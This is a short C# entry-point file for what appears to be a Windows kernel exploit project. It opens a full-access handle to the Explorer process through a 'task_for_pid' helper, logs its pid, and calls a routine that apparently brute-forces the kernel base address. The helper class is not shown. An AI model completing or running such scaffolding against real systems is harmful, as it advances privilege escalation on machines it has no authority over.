using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace win_kern_port
{
    class Program
    {
        static void Main(string[] args)
        {
            kutil exploit_main = new kutil();
            IntPtr task_t=exploit_main.task_for_pid(0x0fffff, false, System.Diagnostics.Process.GetProcessesByName("EXPLORER")[0].Id);
            exploit_main.LOG("pid_t -> {0}", System.Diagnostics.Process.GetProcessesByName("EXPLORER")[0].Id);
            exploit_main.bf_kernel_base();
           
        }
    }
}
